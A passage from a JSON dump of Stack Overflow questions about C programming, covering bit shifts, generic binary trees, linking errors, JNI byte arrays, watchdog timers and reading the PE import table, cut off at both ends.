printf(\"%d\\n\",array[d+1]);\n\n  return 0;\n}\n</code></pre>\n"},{"tags":["c++","c","source-insight","tabbed-interface","tabbed-view"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":13229405,"title":"Source Insight type editor with tabbed windows and dividers?","body":"<p>I really like the set up of Source Insight, it has a context window for one click understanding of function calls and variables, and a relations window for where functions are called in a project and where variables are used in the project.</p>\n\n<p>It is very good for jumping around in a project and understanding the use of variables, but one thing that's missing is tabbed windows and dividers. It is stuck in the one source file, one window phase of IDE development, before tabs and vertical/horizontal dividers got popular.</p>\n\n<p>It is also very good at finding references for variables and functions, much better than code blocks, codewright, and eclipse (really tried all of them).</p>\n\n<p>Does anyone know or have a set up similar to Source Insight but with Tabs and dividers?</p>\n"},{"tags":["c++","c","x86","bit-manipulation","bit-shift-operators"],"answer_count":1,"favorite_count":2,"up_vote_count":6,"down_vote_count":0,"view_count":107,"score":6,"question_id":13221369,"title":"logical shift right on signed data","body":"<p>Before anything, no this is not my homework, it's a lab given by a book called \"Computer Systems A Programmer's Perspective\" (Excellent book btw) </p>\n\n<p>I need to perform a logical shift right on signed integers without using any the following:<br>\n-casting<br>\n-if, while, select, for, do-while, ?: <br>\n-pointers of any type<br></p>\n\n<p>Allowed operators are:\n! + ~ | >> &lt;&lt; ^ </p>\n\n<p>What have I tried so far?</p>\n\n<pre><code>/* \n * logicalShift - shift x to the right by n, using a logical shift\n *   Can assume that 0 &lt;= n &lt;= 31\n *   Examples: logicalShift(0x87654321,4) = 0x08765432\n *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;\n *   Max ops: 20\n *   Rating: 3 \n */\nint logicalShift(int x, int n) {\n    int mask = ~0;\n    int shiftAmount = 31 + ((~n)+1);//this evaluates to 31 - n on two's complement machines\n    mask = mask &lt;&lt; shiftAmount;\n    mask = ~mask;//If n equals 0, it means we have negated all bits and hence have mask = 0\n    x = x &gt;&gt; n;\n    return x &amp; mask; \n}\n</code></pre>\n\n<p>This works just fine as long as n doesn't equal 0, when it does this code breaks because the mask will turn to all 0s and the function will return 0.</p>\n\n<p>I'd appreciate any hint in the right direction rather than a complete code.<br>\n<br> Again, this is not a homework; the lab-assignments are publicly available here <a href=\"http://csapp.cs.cmu.edu/public/labs.html\" rel=\"nofollow\">http://csapp.cs.cmu.edu/public/labs.html</a></p>\n\n<p>P.S Not a duplicate, do not post solutions that involve casting to unsigned and then shifting.</p>\n"},{"tags":["c","gcc","inline"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":13228326,"title":"force inline function in other translation unit","body":"<p>This part of the gcc manual is pretty obscure and i can't understand the usage of the forceinline attribute after repeated attempts.</p>\n\n<p>I'm defining an object and certain functions to manipulate that object. Few of those functions can use atomic instructions and i want the compiler to inline those functions. However i do not want to write those functions in the header file and declare them with \"static inline\" like in the linux kernel.</p>\n\n<p>Is there a way to force gcc to inline functions from another translation unit ?</p>\n"},{"tags":["c++","c","linux","optimization"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":78,"score":1,"question_id":13228465,"title":"possible optimizations for manipulating a 2d array","body":"<p>I have an image represented by a 2D array of chars, I need to perform some operations on this image and store the result in another 2D array, these operations vary from calculating average value of neighbour cells to reordering rows.\nwhat are possible optimisations I can do to get better performance?\nany possible techniques are welcome (e.g locality of references, inline assembly, ...)</p>\n\n<p>I use <code>c</code> on a linux x86_64 machine</p>\n\n<p>PS: I have raw color images with each pixel represented by a group of RGB values.</p>\n"},{"tags":["c","generics","binary-tree","function-pointers","binary-search-tree"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":13224924,"title":"Generic binary search tree in C","body":"<p>I have the implemented a binary search tree but I also want to make it generic. The code is the following:</p>\n\n<pre><code>typedef struct treeNode {\n  int data;\n  struct treeNode *left;\n  struct treeNode *right;\n} treeNode;\n</code></pre>\n\n<p>and the functions:</p>\n\n<pre><code>treeNode* FindMin(treeNode *node) {\n  if(node==NULL) {\n    /* There is no element in the tree */\n    return NULL;\n  }\n  if(node-&gt;left) /* Go to the left sub tree to find the min element */\n    return FindMin(node-&gt;left);\n  else \n    return node;\n}\n\ntreeNode * Insert(treeNode *node,int data) {\n  if(node==NULL) {\n    treeNode *temp;\n    temp = (treeNode *)malloc(sizeof(treeNode));\n    temp -&gt; data = data;\n    temp -&gt; left = temp -&gt; right = NULL;\n    return temp;\n  }\n\n  if(data &gt; (node-&gt;data)) {\n    node-&gt;right = Insert(node-&gt;right,data);\n  }\n  else if(data &lt;= (node-&gt;data)) {\n    node-&gt;left = Insert(node-&gt;left,data);\n  }\n/* Else there is nothing to do as the data is already in the tree. */\n  return node;\n}\n\ntreeNode * Delete(treeNode *node, int data) {\n  treeNode *temp;\n  if(node==NULL) {\n    printf(\"Element Not Found\");\n  }\n  else if(data &lt; node-&gt;data) {\n    node-&gt;left = Delete(node-&gt;left, data);\n  }\n  else if(data &gt; node-&gt;data) {\n    node-&gt;right = Delete(node-&gt;right, data);\n  }\n  else {\n    /* Now We can delete this node and replace with either minimum element \n       in the right sub tree or maximum element in the left subtree */\n    if(node-&gt;right &amp;&amp; node-&gt;left) {\n        /* Here we will replace with minimum element in the right sub tree */\n        temp = FindMin(node-&gt;right);\n        node -&gt; data = temp-&gt;data; \n        /* As we replaced it with some other node, we have to delete that node */\n        node -&gt; right = Delete(node-&gt;right,temp-&gt;data);\n    }\n    else {\n        /* If there is only one or zero children then we can directly \n            remove it from the tree and connect its parent to its child */\n        temp = node;\n        if(node-&gt;left == NULL)\n            node = node-&gt;right;\n        else if(node-&gt;right == NULL)\n            node = node-&gt;left;\n        free(temp); /* temp is longer required */ \n    }\n}\n  return node;\n\n}\n\nvoid PrintInorder(treeNode *node) {\n  if (node != NULL) {\n    PrintInorder(node-&gt;left);\n    printf(\"%d \",node-&gt;data);\n    PrintInorder(node-&gt;right);\n  }\n}\n</code></pre>\n\n<p>First thing is to change in the struct</p>\n\n<pre><code>int data;\n</code></pre>\n\n<p>to</p>\n\n<pre><code>void *data;\n</code></pre>\n\n<p>Edited with more code: </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\ntypedef struct treeNode {\n  void *data;\n  struct treeNode *left;\n  struct treeNode *right;\n}treeNode;\n\ntreeNode * Insert(treeNode *node, void *data, int sizeOfType, int (*compare) (void *arg1, void *arg2)) { \n  if(node==NULL) {\n    treeNode *temp;\n    temp = malloc(sizeof(*temp));\n    temp-&gt;data = malloc(sizeOfType);\n    memcpy(temp-&gt;data, data, sizeOfType);\n    temp -&gt; left = temp -&gt; right = NULL;\n    return temp;\n  }\n\n  if(compare(data, node-&gt;data) == 1) {\n    node-&gt;right = Insert(node-&gt;right, data, sizeof(int), compare(data, node-&gt;data));\n  }\n  else if(compare(data, node-&gt;data) == -1 || compare(data, node-&gt;data) == 0) {\n    node-&gt;left = Insert(node-&gt;left, data, sizeof(int), compare(data, node-&gt;data));\n  }\n  return node;\n}\n\nvoid print(void* a) { \nprintf(\"%d \",*(int*)a); \n}\n\nvoid InorderGeneric(treeNode *node, void(*p)(void *)) { \n  if (node != NULL) {                                \n    InorderGeneric(node-&gt;left, p);\n    p(node-&gt;data);  \n    InorderGeneric(node-&gt;right, p); \n  }\n}\n\nint int_sorter( void *first_arg, void *second_arg ) {\n  int first = *(int*)first_arg;\n  int second = *(int*)second_arg;\n  if ( first &lt; second ) {\n    return -1;\n  }\n  else if ( first == second ) {\n    return 0;\n  }\n  else {\n    return 1;\n  }\n}\n\nint main(void) {\n  treeNode *root = NULL;\n  int item;\n  void *v;\n\n  printf(\"Add nodes in binary tree:\\n\");\n  while (scanf(\"%d \", &amp;item) == 1) {\n    v = &amp;item;\n    root = Insert(root, v, sizeof(int), int_sorter);\n  }\n\n  printf(\"\\n---Initial tree---\\n\");\n  printf(\"IN-order walk of tree:\\n\");\n  InorderGeneric(root, print);\n  printf(\"\\n\");\n\n  return 0;\n }\n</code></pre>\n"},{"tags":["c","endianness"],"answer_count":11,"favorite_count":6,"up_vote_count":10,"down_vote_count":1,"view_count":29881,"score":9,"question_id":2182002,"title":"convert big endian to little endian in C [without using provided func]","body":"<p>I need to write a function to convert big endian to little endian in C. I can not use any library function.</p>\n"},{"tags":["c++","c","iostream","cout","bug"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":7,"view_count":121,"score":-7,"question_id":13228486,"title":"is this a bug in cout","body":"<p>From my experiences,\nmany times I used cout for debugging and I saw this weird error.<br>\nWhenever I delete all my couts, every thing works fine.<br>\nThis does not happen every time, but it happen (sometimes) when I use so many large buffers and mmap.<br>\nI think the memory area for the heap or stack ran into the cout buffer. I think that it has to do with mmap because mmap location is in the middle between the heap and stack. I am not sure where the memory location for cout. However, I think they have connection. \nThen the program tries to delete it two times. I did not use any \"new\" variables so that this error is not do to it.</p>\n\n<pre><code>*** glibc detected *** client: munmap_chunk(): invalid pointer: 0x00007f1ec85c66f0 ***\n======= Backtrace: =========\n/lib64/libc.so.6(+0x76ce6)[0x7f1ec7e25ce6]\nclient[0x4022a9]\nclient[0x4014ea]\n/lib64/libc.so.6(__libc_start_main+0xfd)[0x7f1ec7dcdb6d]\nclient[0x400f59]\n======= Memory map: ========\n00400000-00406000 r-xp 00000000 00:16 872724                             /user/s4/malsadah/csci640/p3/p3_2/c/client\n00605000-00606000 rw-p 00005000 00:16 872724                             /user/s4/malsadah/csci640/p3/p3_2/c/client\n00606000-00627000 rw-p 00000000 00:00 0                                  [heap]\n7f1ec7ba2000-7f1ec7bae000 r-xp 00000000 08:01 19317                      /lib64/libnss_files-2.11.1.so\n7f1ec7bae000-7f1ec7dad000 ---p 0000c000 08:01 19317                      /lib64/libnss_files-2.11.1.so\n7f1ec7dad000-7f1ec7dae000 r--p 0000b000 08:01 19317                      /lib64/libnss_files-2.11.1.so\n7f1ec7dae000-7f1ec7daf000 rw-p 0000c000 08:01 19317                      /lib64/libnss_files-2.11.1.so\n7f1ec7daf000-7f1ec7f1a000 r-xp 00000000 08:01 19322                      /lib64/libc-2.11.1.so\n7f1ec7f1a000-7f1ec811a000 ---p 0016b000 08:01 19322                      /lib64/libc-2.11.1.so\n7f1ec811a000-7f1ec811e000 r--p 0016b000 08:01 19322                      /lib64/libc-2.11.1.so\n7f1ec811e000-7f1ec811f000 rw-p 0016f000 08:01 19322                      /lib64/libc-2.11.1.so\n7f1ec811f000-7f1ec8124000 rw-p 00000000 00:00 0\n7f1ec8124000-7f1ec813a000 r-xp 00000000 08:07 261655                     /usr/lib64/libgcc_s.so.1\n7f1ec813a000-7f1ec8339000 ---p 00016000 08:07 261655                     /usr/lib64/libgcc_s.so.1\n7f1ec8339000-7f1ec833a000 rw-p 00015000 08:07 261655                     /usr/lib64/libgcc_s.so.1\n7f1ec833a000-7f1ec83bc000 r-xp 00000000 08:01 19302                      /lib64/libm-2.11.1.so\n7f1ec83bc000-7f1ec85bb000 ---p 00082000 08:01 19302                      /lib64/libm-2.11.1.so\n7f1ec85bb000-7f1ec85bc000 r--p 00081000 08:01 19302                      /lib64/libm-2.11.1.so\n7f1ec85bc000-7f1ec85bd000 rw-p 00082000 08:01 19302                      /lib64/libm-2.11.1.so\n7f1ec85bd000-7f1ec86ae000 r-xp 00000000 08:07 261872                     /usr/lib64/libstdc++.so.6.0.13\n7f1ec86ae000-7f1ec88ae000 ---p 000f1000 08:07 261872                     /usr/lib64/libstdc++.so.6.0.13\n7f1ec88ae000-7f1ec88b5000 r--p 000f1000 08:07 261872                     /usr/lib64/libstdc++.so.6.0.13\n7f1ec88b5000-7f1ec88b7000 rw-p 000f8000 08:07 261872                     /usr/lib64/libstdc++.so.6.0.13\n7f1ec88b7000-7f1ec88cc000 rw-p 00000000 00:00 0\n7f1ec88cc000-7f1ec88ec000 r-xp 00000000 08:01 19346                      /lib64/ld-2.11.1.so\n7f1ec8ab9000-7f1ec8abd000 rw-p 00000000 00:00 0\n7f1ec8add000-7f1ec8ade000 rw-p 00000000 00:00 0\n7f1ec8ade000-7f1ec8aea000 r--p 00000000 00:16 872401                     /user/s4/malsadah/csci640/p3/p3_2/c/j/f\n7f1ec8aea000-7f1ec8aeb000 rw-p 00000000 00:00 0\n7f1ec8aeb000-7f1ec8aec000 r--p 0001f000 08:01 19346                      /lib64/ld-2.11.1.so\n7f1ec8aec000-7f1ec8aed000 rw-p 00020000 08:01 19346                      /lib64/ld-2.11.1.so\n7f1ec8aed000-7f1ec8aee000 rw-p 00000000 00:00 0\n7fff3eed4000-7fff3ef14000 rw-p 00000000 00:00 0                          [stack]\n7fff3ef7f000-7fff3ef80000 r-xp 00000000 00:00 0                          [vdso]\nffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]\nAborted\n</code></pre>\n"},{"tags":["c++","c","macros","preprocessor"],"answer_count":3,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":3051,"score":1,"question_id":806543,"title":"C++ Macros: manipulating a parameter (specific example)","body":"<p>I need to replace</p>\n\n<pre><code>GET(\"any_name\")\n</code></pre>\n\n<p>with</p>\n\n<pre><code>String str_any_name = getFunction(\"any_name\");\n</code></pre>\n\n<p>The hard part is how to trim off the quote marks. Possible? Any ideas?</p>\n"},{"tags":["c"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":13228111,"title":"C - Undefined reference to 'sqrt'","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/4120592/c-programming-sqrt-function\">C programming sqrt function</a>  </p>\n</blockquote>\n\n\n\n<p>i'm facing a weird problem in C. I've included the  library in the header, and for example the <code>pow(x,n)</code> function works as well.\nOn the other hand ,the next code does does not run at all:</p>\n\n<pre><code>float calcArea(double edgeA){\n    double s=edgeA;\n    float area = sqrt(s);\n    return area;\n}\n</code></pre>\n\n<p>But when I change <code>sqrt(s)</code> to <code>sqrt(45)</code> (or any other natural number) it doesn't make any problem.\nI've also checked the <code>sqrt()</code> function more few times, and it's still doesn't as long as the argument is a variable.</p>\n\n<p>Any suggestion for solving this problem will be helpful,\nThanks in advance</p>\n\n<p><strong>EDIT : I'm using Eclipse</strong></p>\n"},{"tags":["c","algorithm","cryptography","whirlpool"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":478,"score":2,"question_id":4108595,"title":"An explanation of Whirlpool C implementation - or the general algorithm","body":"<p>Anyone got a tutorial on the designers concept implementation of Whirlpool in C, or the Whirlpool algorithm in general? I find the source code hard to understand, mostly because I do not know anything about the algorithm. I am not a cryptographer, nor am I a good mathematican, so their documentation kind of went over my head... </p>\n\n<p>The implementation and other documentation can be found <a href=\"http://www.larc.usp.br/~pbarreto/WhirlpoolPage.html\" rel=\"nofollow\">here</a></p>\n\n<p>Initially I was just searching for a free (public domain) implementation to use in a project, but I figured I better know something about it as well... Currently I do not even know how to use it.</p>\n"},{"tags":["c","json","winapi","api"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":514,"score":1,"question_id":5449197,"title":"Does win32 have a \"native\" JSON API that can be called from C?","body":"<p>Is there a native C implementation of JSON in the Windows API?</p>\n\n<p>If not, is there such a JSON API for .NET or C# that can still be used from plain old C code?</p>\n\n<p>Failing that, is there any JSON library or implementation that is \"most popular\" among developers on the Windows platform using C-like languages?</p>\n"},{"tags":["c","static","global"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":62,"score":2,"question_id":13227986,"title":"can static declared global variable can be accessed with extern in another file?","body":"<p>I have one doubt if i declared global variable with static.</p>\n\n<h2>file1.c</h2>\n\n<pre><code>static int a=5;\n\nmain()\n{\n   func();\n}\n</code></pre>\n\n<p>can it be access in another file2.c using extern ?</p>\n\n<h2>file2.c</h2>\n\n<pre><code>func()\n{\n   extern int a;\n   printf(a);\n}\n</code></pre>\n\n<p>or only global variable declared without static can be access using extern?</p>\n"},{"tags":["c","linux","math","gcc","linker"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":13227406,"title":"libm link issue in gcc 4.6.3","body":"<p>The linking of math.lib using -lm is working is a different manner in gcc 4.6.3.</p>\n\n<p>It use to work <strong>gcc -lm file.c</strong> but in <strong>gcc 4.6.3</strong> its <strong>gcc file.c -lm</strong>. </p>\n\n<p>What is the reason for this change? Or is it a bug? </p>\n\n<p>Thanks</p>\n\n<p>This is a part of the code. </p>\n\n<pre><code>    float i = 100;\n    printf(\"%f\", sqrt(i));\n    return 0;\n</code></pre>\n\n<p>I complied like this</p>\n\n<p>gcc -lm mat.c </p>\n\n<p>/tmp/ccPxTEjS.o: In function `main':</p>\n\n<p>mat.c:(.text+0x2c): undefined reference to `sqrt'</p>\n\n<p>collect2: ld returned 1 exit status</p>\n\n<p>Operating System : Ubuntu 12.04</p>\n"},{"tags":["c","linux","sockets","linux-kernel","kernel-module"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":44,"score":1,"question_id":13227315,"title":"UDP packet send with linux-kernel module without using sockets","body":"<p>I am writing a kernel module which creates a IP packet. Now i want to send this packet but haven't created any socket for it's transmission.</p>\n\n<p>is there any way to send it directly with the help of kernel routines.</p>\n\n<p>as i have tracked the linux kernel code for packet transmission there is a function defined in  <strong>net/core/dev.c</strong> named as <strong>dev_hard_start_xmit()</strong>. can we use it?</p>\n\n<p>Actually i don't want to use sockets.</p>\n"},{"tags":["c","visual-studio","visual-studio-2012","zlib","void"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":26,"score":1,"question_id":13227554,"title":"Zlib in Visual Studio 2012","body":"<p>I am following <a href=\"http://tpgit.github.com/UnOfficialLeptDocs/vs2008/building-image-libraries.html#building-zlib\" rel=\"nofollow\">these instructions</a> to test the zlibStat library with testzlib. When I try to build testzlib, it throws the following error in <a href=\"https://github.com/madler/zlib/blob/master/contrib/testzlib/testzlib.c\" rel=\"nofollow\"><strong>testzlib.c</strong></a>, Line: 167, Char:43:</p>\n\n<blockquote>\n  <p><code>IntelliSense: argument of type \"unsigned char **\" is incompatible with parameter of type \"void **\"</code>   </p>\n</blockquote>\n\n<p>Is it a specification change in C11, a bug in VC 11 or a bad code? </p>\n\n<p>Is there a workaround? I tried changing <code>unsigned char* FilePtr;</code> to <code>void* FilePtr;</code>, but then the <em>assignment operator</em> throws the error on Line 200. Any thoughts?</p>\n\n<p><br></p>\n\n<h1>Solution</h1>\n\n<p>I followed Icepack's answer. Then I got an error on line 141, so I changed it to <code>*pFilePtr=(unsigned char*)ptr;</code>. Hopefully zlib guys would update their code accordingly.</p>\n"},{"tags":["c","gcc","linker","shared-libraries","x86-64"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":13223646,"title":"Function prototypes when using a shared library","body":"<p>I'm not sure of the correct terminology to use to describe this problem, but I will try my best.</p>\n\n<p>I'm writing a toy program that prints the factorial of 12 and 13 in test.c:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main(void)\n{\n    printf(\"%ld\\n\", factorial(12));\n    printf(\"%ld\\n\", factorial(13));\n    return 0;\n}\n</code></pre>\n\n<p>The factorial function is defined in a shared library with source fact.c</p>\n\n<pre><code>long factorial(int n)\n{\n    long r = 1;\n    while (n &gt; 1) r *= n--;\n    return r;\n}\n</code></pre>\n\n<p>I am compiling the shared library and my program with the following commands:</p>\n\n<pre><code>$ gcc -shared -fPIC -o libfact.so fact.c\n$ gcc -L. -lfact test.c\n</code></pre>\n\n<p>I am on x86-64, so I expect that <code>factorial(13)</code> (13! = 6227020800) does not overflow a 64-bit long. However, I get a strange result.</p>\n\n<pre><code>$ LD_LIBRARY_PATH=. ./a.out\n479001600\n1932053504\n</code></pre>\n\n<p>Here, 1932053504 happens to be the decimal value of the lower 32 bits of the correct result. If, however, I insert the function prototype <code>long factorial(int)</code> at the top of test.c and recompile, I get the correct result.</p>\n\n<pre><code>$ LD_LIBRARY_PATH=. ./a.out\n479001600\n6227020800\n</code></pre>\n\n<p>This leaves me with a couple questions:</p>\n\n<ol>\n<li>What is the assumed return type if I do not specify a prototype in test.c? Is this compiler dependent?</li>\n<li>Without a prototype, I seem to be able to pass in any arbitrary number of arguments to <code>factorial</code>. Is this related to this <a href=\"http://stackoverflow.com/questions/693788/c-void-arguments\">question about C void arguments</a> and this <a href=\"http://stackoverflow.com/questions/946765/are-there-any-benefits-to-not-using-function-prototypes-in-c\">question about function prototypes</a>?</li>\n<li>Why doesn't the linker throw an undefined reference error?</li>\n</ol>\n"},{"tags":["c","embedded","rtos","watchdog"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":94,"score":3,"question_id":13217959,"title":"How to use the watchdog timer in a RTOS?","body":"<p>Assume I have a cooperative scheduler in an embedded environment. I have many processes running. I want to utilize the watchdog timer so that I can detect when a process has stopped behaving for any reason and reset the processor. </p>\n\n<p>In simpler applications with no RTOS I would always touch the watchdog from the main loop and this was always adequate. However, here, there are many processes that could potentially hang. What is a clean method to touch the watchdog timer periodically while ensuring that each process is in good health?</p>\n\n<p>I was thinking that I could provide a callback function to each process so that it could let another function, which oversees all, know it is still alive. The callback would pass a parameter which would be the tasks unique id so the overseer could determine who was calling back. </p>\n"},{"tags":["c","compiler","terminology"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":95,"score":4,"question_id":11029154,"title":"Compilers that compile `generic made up language X` into portable C","body":"<p>I'm looking for two things. The first is a terminology.</p>\n\n<p>What do we call compilers that compiles one language into another?</p>\n\n<p>Secondly, are there any compilers that compile <em>generic made up language X</em> into portable C code?</p>\n\n<p>I'm just throwing the idea out there, but I was thinking, what if we created our own front-end for a our own language of choice, but instead of going the whole way, the compiler emitted portable C code. This way, we could add new language features but still be very compatible with existing C code.</p>\n\n<p>Now maybe there's a huge flaw in this approach (except that you need to build it) but do people do this?</p>\n"},{"tags":["c","assembly","bit-shift"],"answer_count":1,"favorite_count":2,"up_vote_count":6,"down_vote_count":0,"view_count":1765,"score":6,"question_id":4008159,"title":"Assembly Language to C","body":"<p>so I have the following assembly language code which I need to convert into C. I am confused on a few lines of the code.</p>\n\n<p>I understand that this is a for loop. I have added my comments on each line.</p>\n\n<p>I think the for loop goes like this</p>\n\n<pre><code>for (int i = 1; i &gt; 0; i &lt;&lt; what?) {\n     //calculate result\n }\n</code></pre>\n\n<p>What is the test condition? And how to change i?\nI don't understand looking at the assembly code what the variable 'n' does?</p>\n\n<p>This is Intel x86 so the format is movl = source, dest</p>\n\n<pre><code>  movl 8(%ebp), %esi     //get x\n  movl 12(%ebp), %ebx    //get n\n  movl $-1, %edi         //this should be result\n  movl $1, %edx          //the i of the loop\n.L2:\n  movl %edx, %eax        \n  andl %esi, %eax\n  xorl %eax, %edi        //result = result ^ (i &amp; x)\n  movl %ebx, %ecx        //Why do we do this? As we never use $%ebx or %ecx again\n  sall %cl, %edx         //Where did %cl come from?\n  testl %edx, %edx       //tests if i != what? - condition of the for loop\n  jne .L2                //loop again\n  movl %edi, %eax        //otherwise return result.\n</code></pre>\n\n<p>Any help would be appreciated. \nThank you</p>\n"},{"tags":["c","gcc","cuda","gpgpu","nvcc"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":13180154,"title":"compiling cuda with gcc results in: error: ‘threadIdx’ undeclared","body":"<p>How can I force GCC to compile with threadIdx lines in my code?</p>\n\n<p>I'm attempting to compile my cuda application with a c wrapper.</p>\n\n<p>To generate the .so file I run:\nnvcc -arch=sm_11 -o libtest.so --shared -Xcompiler -fPIC main.cu</p>\n\n<p>Then I attempt to compile the c wrapper with:\ngcc -std=c99 -I/usr/local/cuda/include -o main -L. -ltest main.c</p>\n\n<p>This results in the following error a few layers down in my code(an include to an included file):\nerror: ‘threadIdx’ undeclared </p>\n\n<p>Note: Everything does compile and run just fine as a GPU application without any C wrapping.</p>\n"},{"tags":["c++","c","math","hash","hashmap"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":26,"score":1,"question_id":13227340,"title":"HASH functions and implementing multi key hash maps","body":"<p><strong>Objective</strong> : Create a hash map that takes 2 integer keys(pointers converted to integers using unsigned int casting, and yes this works) and maps it to a single value.</p>\n\n<p><strong>Attempted Solution</strong>: So i already have a hash map that takes a single key and maps it to value successfully. I now extended it to taking two keys using a \"pairing function\" see.. <a href=\"http://en.wikipedia.org/wiki/Pairing_function\" rel=\"nofollow\">http://en.wikipedia.org/wiki/Pairing_function</a>. So i take the two keys , pair them using the Cantor pairing function and then hash this combined key .</p>\n\n<p><strong>Bottleneck:</strong> So the problem with two keys is that the cantor pairing function does a multiplication which causes integer overflow and hence \"does not\" give me unique outputs, as it is supposed to do mathematically.</p>\n\n<p><strong>Question</strong>: </p>\n\n<ol>\n<li>I see that a lot of hashing functions do multiplications. Is integer overflow a normal thing in hashing or is this bad?</li>\n<li>Im also thinking of doing an append of one key on the other into a new 64 bit integer. like aaaaaaaabbbbbbbb and then pass it on to the hash map. But I fear that this might cause abnormal numbers like NaN to come up due to the floating point representation, which could be bad.</li>\n<li>Any better ideas are welcome. </li>\n</ol>\n\n<p>Please let me know if some parts are unclear.</p>\n"},{"tags":["c","monitor"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":25,"score":-1,"question_id":13226966,"title":"Monitor error on using Ubunto","body":"<p>I've been asked to compile the code below, but when I try to compile it I get the following error messages:</p>\n\n<pre><code>dee@ubuntu:~/ gcc tr.c\n\ntr.c: In function ‘main’:\n\ntr.c:7:2: error: unknown type name ‘monitor’\n\ntr.c:7:16: error: expected ‘=’, ‘,’, ‘;’, ‘asm’ or ‘__attribute__’ before ‘{’ token\n\ntr.c:36:1: error: expected declaration or statement at end of input\n</code></pre>\n\n<p>Excuse my knowledge, but I know nothing about C, so will you guys please help. I think its because it does not know what a monitor is, so how would I get it to work?. The environment I'm using is Ubunto</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\nint main (int argc, char *argv[]) {\n\n    monitor tunnel{\n        int northbound = 0, southbound = 0;\n        traffic_signal northbound_signal = RED, southbound_signal = RED;\n        condition busy;\n        boolean busy = TRUE;\n\n    public:\n        northboundArrival(){\n        if(southbound &gt; 0) busy.wait;\n        northbound = northbound+1;\n        northbound_signal = GREEN;\n        southbound_signal = RED;\n        };\n        southboundArrival(){\n        if(northbound &gt; 0)  busy.wait;\n        southbound = southbound+1;\n        southbound_signal = GREEN;\n        northbound_signal = RED;\n        };\n        depart(Direction exit){\n        if(exit==north){\n        northbound = northbound-1;\n        if(northbound==0) while (busy.queue) busy.signal;\n        };\n        else if(exit==south){\n        southbound = southbound-1;\n        if(southbound==0) while(busy.queue) busy.signal;\n        }\n    }\n};\n</code></pre>\n"},{"tags":["c","jni","data-type-conversion"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":13227055,"title":"converting unsigned char * to jbytearray","body":"<p>I am trying to convert an <code>unsigned char *</code> to <code>jbyteArray</code> using the following code</p>\n\n<pre><code>int callWR(const char *name,unsigned char *ubuf)\n{\n\n    jbyteArray bArray=env-&gt;NewByteArray(strlen((const char *)ubuf));\n    env-&gt;SetByteArrayRegion(bArray, 0, strlen((const char *)ubuf), (jbyte *)ubuf);\n    jstring tableName= (env)-&gt;NewStringUTF(name);       \n    int status;     \n    status=(int)(env)-&gt;CallStaticIntMethod(clsMC,midWRow,tableName,bArray);\n    env-&gt;DeleteLocalRef(bArray);\n    return status;\n}\n</code></pre>\n\n<p>Is this the right method to pass a byte array argument through JNI to a java function? is type casting <code>(jbyte *)ubuf</code> an efficient way of converting a <code>unsigned char *</code> to <code>jbyte *</code>? The values that I am getting at the destination seem to be messed up. Help please.</p>\n"},{"tags":["c","format","pe"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":177,"score":2,"question_id":7673754,"title":"PE Format - IAT Questions","body":"<p>I'm trying to write an exe packer for windows. I've got some of the basics worked out so far. The part I'm up to though is reading the \"BOUND IMPORT Directory Table\" (or .idata section?), basically the section of the PE file that contains the list of DLLs that the loader needs to import.</p>\n\n<p>I'm wondering what the best way to either:</p>\n\n<p>[A] find out where the IAT is (because running PEView against a few different .exe's seems to show that this list can be contained in multiple different places) and then read the list</p>\n\n<p>OR </p>\n\n<p>[B] Just find a way to directly read the list of DLLs that an exe needs to import.</p>\n\n<p>Is there a way of doing this? Is there any further reading people can recommend on where the IAT should be and how does one read it? </p>\n"},{"tags":["c++","c","pointers"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":100,"score":3,"question_id":13226575,"title":"Pointers in C vs C++","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/3477741/why-does-c-require-a-cast-for-malloc-but-c-doesnt\">Why does C++ require a cast for malloc() but C doesn’t?</a>  </p>\n</blockquote>\n\n\n\n<p>This particular piece of code runs fine in C, but gives compilation error when compiled as a C++ program.</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\nint main(){\n    int (*b)[10];\n    b = calloc(20, sizeof(int));\n    return 0;\n}\n</code></pre>\n\n<p>The error in C++ compilation is:</p>\n\n<pre><code>test.cpp: In function ‘int 